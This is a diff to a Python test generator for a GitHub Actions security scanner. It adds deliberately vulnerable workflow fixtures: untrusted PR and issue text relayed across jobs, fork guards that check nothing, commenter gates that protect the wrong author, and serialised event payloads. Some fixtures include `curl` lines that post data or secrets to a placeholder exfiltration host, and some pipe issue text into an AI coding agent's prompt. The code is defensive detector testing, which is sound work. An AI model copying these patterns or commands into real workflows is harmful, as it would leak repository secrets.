@@ -47,6 +47,7 @@ UNTRUSTED_PAYLOADS = (
     "github.event.commits.0.message",
     "github.head_ref",
     "github.event.pull_request.head.ref",
+    "github.event.workflow_run.display_title",
 )
 
 # Inputs whose content an agent treats as instructions.
@@ -312,6 +313,91 @@ def _cross_job_cases() -> Iterator[Case]:
     )
 
 
+def _cross_job_relay_cases() -> Iterator[Case]:
+    """One pass-through job between the taint and the privilege. Provenance was
+    computed per job from its own hits, so a relay that re-exported an output or
+    re-uploaded an artifact laundered it, and the privileged job read as a
+    compliant note."""
+    yield Case(
+        name="cross-job-relay(needs.outputs)",
+        expect_rule="cross-job-untrusted-flow",
+        workflow=f"""
+        on:
+          pull_request_target:
+            types: [opened]
+        jobs:
+          meta:
+            runs-on: ubuntu-latest
+            outputs:
+              title: ${{{{ steps.g.outputs.title }}}}
+            steps:
+              - id: g
+                run: echo "title=${{{{ github.event.pull_request.title }}}}" >> "$GITHUB_OUTPUT"
+          relay:
+            needs: meta
+            runs-on: ubuntu-latest
+            outputs:
+              title: ${{{{ needs.meta.outputs.title }}}}
+            steps:
+              - run: echo relaying
+          publish:
+            needs: relay
+            runs-on: ubuntu-latest
+            permissions:
+              contents: write
+            steps:
+              - run: ./release.sh "${{{{ needs.relay.outputs.title }}}}"
+                env:
+                  NPM_TOKEN: {_SECRET}
+        """,
+    )
+    yield Case(
+        name="cross-job-relay(artifact)",
+        expect_rule="cross-job-untrusted-flow",
+        workflow=f"""
+        on:
+          pull_request_target:
+            types: [opened, synchronize]
+        jobs:
+          build:
+            runs-on: ubuntu-latest
+            steps:
+              - uses: actions/checkout@v4
+                with:
+                  ref: ${{{{ github.event.pull_request.head.sha }}}}
+              - run: npm ci && npm run build
+              - uses: actions/upload-artifact@v4
+                with:
+                  name: bundle
+                  path: dist
+          package:
+            needs: build
+            runs-on: ubuntu-latest
+            steps:
+              - uses: actions/download-artifact@v4
+                with:
+                  name: bundle
+              - run: tar czf release.tgz dist
+              - uses: actions/upload-artifact@v4
+                with:
+                  name: release
+                  path: release.tgz
+          deploy:
+            needs: package
+            runs-on: ubuntu-latest
+            permissions:
+              contents: write
+            steps:
+              - uses: actions/download-artifact@v4
+                with:
+                  name: release
+              - run: tar xzf release.tgz && node dist/index.js
+                env:
+                  NPM_TOKEN: {_SECRET}
+        """,
+    )
+
+
 def _cross_job_artifact_cases() -> Iterator[Case]:
     """Taint that crosses jobs through a run-scoped artifact, not a job output.
     The `build` job checks out pull request code and uploads it as an artifact;
@@ -520,6 +606,60 @@ def _run_checkout_cases() -> Iterator[Case]:
                       NPM_TOKEN: {_SECRET}
             """,
         )
+    # Fork guards that guard nothing. Each was once read as the fix bot's guard
+    # because the heuristic only asked whether `isCrossRepository` appeared in
+    # the job: a field listed for logging, or a real test placed after the code
+    # it was meant to keep out, turned this critical into a note.
+    for label, steps in (
+        ("mention-only", """
+              - run: gh pr view "$PR" --json isCrossRepository,headRefName
+                env:
+                  PR: ${{ github.event.issue.number }}
+              - run: gh pr checkout "$PR" && ./build.sh
+                env:
+                  PR: ${{ github.event.issue.number }}
+                  NPM_TOKEN: {secret}
+        """),
+        ("guard-after-fetch", """
+              - run: |
+                  gh pr checkout "$PR"
+                  ./build.sh
+                  cross=$(gh pr view "$PR" --json isCrossRepository -q .isCrossRepository)
+                  if [ "$cross" = "true" ]; then exit 0; fi
+                env:
+                  PR: ${{ github.event.issue.number }}
+                  NPM_TOKEN: {secret}
+        """),
+        ("guard-in-a-later-step", """
+              - run: gh pr checkout "$PR" && ./build.sh
+                env:
+                  PR: ${{ github.event.issue.number }}
+                  NPM_TOKEN: {secret}
+              - run: |
+                  cross=$(gh pr view "$PR" --json isCrossRepository -q .isCrossRepository)
+                  if [ "$cross" = "true" ]; then exit 0; fi
+                env:
+                  PR: ${{ github.event.issue.number }}
+        """),
+    ):
+        header = textwrap.dedent("""
+            on:
+              issue_comment:
+                types: [created]
+            jobs:
+              fix:
+                runs-on: ubuntu-latest
+                permissions:
+                  contents: write
+                steps:
+            """)
+        body = textwrap.indent(textwrap.dedent(steps).strip("\n"), " " * 6)
+        yield Case(
+            name=f"run-checkout-fork-guard-bypass[{label}]",
+            expect_rule="untrusted-checkout-privileged-egress",
+            workflow=header + body.replace("{secret}", _SECRET) + "\n",
+        )
+
     # Control: the SAME fetch, but the job first refuses fork PRs. Now it only
     # pulls same-repo (write-access-authored) code, so it must stay clean — the
     # exact pattern the fix bot uses.
@@ -579,6 +719,76 @@ def _gate_bypass_cases() -> Iterator[Case]:
                       ANTHROPIC_API_KEY: {_SECRET}
             """,
         )
+    # A real gate vets ONE author: the one whose object it names. Both of these
+    # were read as full protection — every `github.event.*` path was trusted
+    # behind any association test — so a maintainer's comment on a stranger's
+    # issue ran the stranger's title, and a gate on the issue author let any
+    # stranger's comment through.
+    _ISSUE_ASSOC = _ASSOC.replace("github.event.comment.", "github.event.issue.")
+    for label, guard, payload in (
+        ("commenter-gate-issue-title", _ASSOC, "github.event.issue.title"),
+        ("issue-gate-comment-body", _ISSUE_ASSOC, "github.event.comment.body"),
+    ):
+        yield Case(
+            name=f"gate-scope[{label}]",
+            expect_rule="expression-injection-privileged",
+            workflow=f"""
+            on:
+              issue_comment:
+                types: [created]
+            jobs:
+              triage:
+                runs-on: ubuntu-latest
+                if: {guard}
+                permissions:
+                  contents: write
+                steps:
+                  - run: |
+                      ./triage.sh "${{{{ {payload} }}}}"
+                      curl -d @- {_EXFIL}
+                    env:
+                      TOKEN: {_SECRET}
+            """,
+        )
+    yield Case(
+        name="gate-scope[commenter-gate-agent-issue-body]",
+        expect_rule="agent-prompt-injection",
+        workflow=f"""
+        on:
+          issue_comment:
+            types: [created]
+        jobs:
+          assist:
+            runs-on: ubuntu-latest
+            if: {_ASSOC}
+            permissions:
+              contents: write
+            steps:
+              - uses: anthropics/claude-code-action@v1
+                with:
+                  prompt: "Fix the issue described here: ${{{{ github.event.issue.body }}}}"
+                env:
+                  ANTHROPIC_API_KEY: {_SECRET}
+        """,
+    )
+    # Control: the vetted author's own text in a shell stays clean.
+    yield Case(
+        name="control:commenter-gate-comment-body",
+        kind="control",
+        workflow=f"""
+        on:
+          issue_comment:
+            types: [created]
+        jobs:
+          triage:
+            runs-on: ubuntu-latest
+            if: {_ASSOC}
+            permissions:
+              contents: write
+            steps:
+              - run: ./triage.sh "${{{{ github.event.comment.body }}}}"
+        """,
+    )
     # Control: the CANONICAL gate the tool itself recommends must stay clean —
     # the fix must not over-correct into "no gate is ever accepted".
     yield Case(
@@ -759,6 +969,100 @@ def _control_cases() -> Iterator[Case]:
     )
 
 
+def _serialized_and_inherited_cases() -> Iterator[Case]:
+    """Two ways attacker text reached a shell or an agent unseen.
+
+    `toJSON(github.event)` serialises every title and body in the payload, but
+    only leaf paths were compared with the table. And `env:` at workflow or job
+    level reaches every step, but only a step's own `env:` was checked for
+    re-expansion."""
+    for label, sink in (
+        ("run", "echo '${{ toJSON(github.event) }}' > event.json"),
+        ("run-issue-object", "./triage.sh '${{ toJSON(github.event.issue) }}'"),
+    ):
+        yield Case(
+            name=f"serialized-event[{label}]",
+            expect_rule="expression-injection-privileged",
+            workflow=f"""
+            on:
+              issues:
+                types: [opened]
+            jobs:
+              triage:
+                runs-on: ubuntu-latest
+                permissions:
+                  contents: write
+                steps:
+                  - run: |
+                      {sink}
+                      curl -d @event.json {_EXFIL}
+                    env:
+                      TOKEN: {_SECRET}
+            """,
+        )
+    yield Case(
+        name="serialized-event[agent-prompt]",
+        expect_rule="agent-prompt-injection",
+        workflow=f"""
+        on:
+          issues:
+            types: [opened]
+        jobs:
+          assist:
+            runs-on: ubuntu-latest
+            permissions:
+              contents: write
+            steps:
+              - uses: anthropics/claude-code-action@v1
+                with:
+                  prompt: "Triage this issue: ${{{{ toJSON(github.event.issue) }}}}"
+                env:
+                  ANTHROPIC_API_KEY: {_SECRET}
+        """,
+    )
+    for level in ("workflow", "job"):
+        workflow_env = "env:\n  TITLE: ${{ github.event.issue.title }}\n" if level == "workflow" else ""
+        job_env = "    env:\n      TITLE: ${{ github.event.issue.title }}\n" if level == "job" else ""
+        yield Case(
+            name=f"inherited-env-reexpansion[{level}]",
+            expect_rule="expression-injection",
+            workflow=(
+                "on:\n  issues:\n    types: [opened]\n"
+                + workflow_env
+                + "jobs:\n  triage:\n    runs-on: ubuntu-latest\n"
+                + "    permissions:\n      contents: write\n"
+                + job_env
+                + "    steps:\n"
+                + '      - run: |\n          eval "echo $TITLE"\n'
+                + f"          curl {_EXFIL}\n"
+                + f"        env:\n          TOKEN: {_SECRET}\n"
+            ),
+        )
+    # Controls: a quoted inherited variable, a serialised object with no
+    # attacker-written field, and a job-level override with a safe value.
+    for label, workflow in (
+        ("quoted-inherited-env",
+         "on:\n  issues:\n    types: [opened]\n"
+         "env:\n  TITLE: ${{ github.event.issue.title }}\n"
+         "jobs:\n  triage:\n    runs-on: ubuntu-latest\n"
+         "    permissions:\n      contents: write\n"
+         '    steps:\n      - run: printf \'%s\\n\' "$TITLE"\n'),
+        ("serialized-labels",
+         "on:\n  issues:\n    types: [opened]\n"
+         "jobs:\n  triage:\n    runs-on: ubuntu-latest\n"
+         "    permissions:\n      contents: write\n"
+         "    steps:\n      - run: echo '${{ toJSON(github.event.issue.labels) }}'\n"),
+        ("safe-job-override",
+         "on:\n  issues:\n    types: [opened]\n"
+         "env:\n  TITLE: ${{ github.event.issue.title }}\n"
+         "jobs:\n  triage:\n    runs-on: ubuntu-latest\n"
+         "    env:\n      TITLE: fixed\n"
+         "    permissions:\n      contents: write\n"
+         '    steps:\n      - run: eval "echo $TITLE"\n'),
+    ):
+        yield Case(name=f"control:{label}", kind="control", workflow=workflow)
+
+
 _GENERATORS = (
     _prompt_injection_cases,
     _shell_injection_cases,
@@ -769,10 +1073,12 @@ _GENERATORS = (
     _mcp_cases,
     _cross_job_cases,
     _cross_job_artifact_cases,
+    _cross_job_relay_cases,
     _workflow_run_cases,
     _env_file_injection_cases,
     _weak_actor_guard_cases,
     _gate_bypass_cases,
+    _serialized_and_inherited_cases,
     _run_checkout_cases,
     _overbroad_cases,
     _self_hosted_cases,
